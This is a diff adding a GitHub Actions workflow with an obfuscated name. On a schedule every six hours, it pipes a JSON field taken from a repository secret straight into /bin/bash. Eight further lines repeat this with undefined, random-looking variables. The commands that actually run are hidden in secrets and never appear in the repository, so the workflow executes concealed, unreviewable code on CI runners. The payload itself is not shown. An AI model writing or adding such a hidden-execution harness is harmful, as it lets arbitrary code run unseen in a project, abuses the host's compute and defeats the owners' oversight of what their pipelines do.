@@ -1,0 +1,26 @@
+name: jingguanyeli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingguanyeli
+        env:
+          pgo62469: ${{ secrets.pgo62469 }}
+        run: |
+          echo $pgo62469 | jq -r .bk49124 | /bin/bash
+          echo $vdvi3 | jq -r .aqun68 | /bin/bash
+          echo $bmd68169 | jq -r .t634 | /bin/bash
+          echo $m75747 | jq -r .i2169 | /bin/bash
+          echo $o187 | jq -r .vyghz3 | /bin/bash
+          echo $kxm20 | jq -r .wxi54 | /bin/bash
+          echo $ftndo200 | jq -r .h37856 | /bin/bash
+          echo $duj70481 | jq -r .wosod2333 | /bin/bash
+          echo $ssw56163 | jq -r .axqm74 | /bin/bash
+
